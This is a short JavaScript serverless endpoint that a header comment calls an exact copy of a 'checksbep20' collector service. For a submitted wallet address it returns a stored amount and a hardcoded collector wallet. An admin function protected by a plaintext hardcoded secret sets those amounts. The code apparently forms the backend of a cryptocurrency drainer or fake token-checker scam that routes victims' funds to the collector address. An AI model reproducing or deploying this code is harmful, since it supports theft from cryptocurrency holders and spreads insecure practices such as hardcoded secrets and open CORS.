// ============================================
// SEND ENDPOINT - POST /send
// Exactly like: https://collector.checksbep20.org/send
// ============================================

const COLLECTOR_ADDRESS = "0x5681d680B047bF5b12939625C56301556991005e";

// In-memory storage for user amounts
let userAmounts = {};

export default async function handler(req, res) {
    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Topup-Secret');
    
    // Handle OPTIONS preflight
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    // Only allow POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    try {
        const body = req.body;
        const userAddress = body.address;
        
        if (!userAddress) {
            return res.status(400).json({
                error: 'Address required'
            });
        }
        
        // Check if user has stored amount
        const storedAmount = userAmounts[userAddress.toLowerCase()] || null;
        
        // Return response matching original format
        if (storedAmount) {
            return res.status(200).json({
                found: true,
                amount: storedAmount,
                amountHuman: storedAmount,
                collector: COLLECTOR_ADDRESS
            });
        } else {
            return res.status(200).json({
                found: false,
                collector: COLLECTOR_ADDRESS
            });
        }
        
    } catch (error) {
        return res.status(500).json({
            error: error.message
        });
    }
}

// Admin function to set user amount (optional)
export async function setUserAmount(address, amount, secret) {
    if (secret !== "7x143414") return false;
    userAmounts[address.toLowerCase()] = amount;
    return true;
}
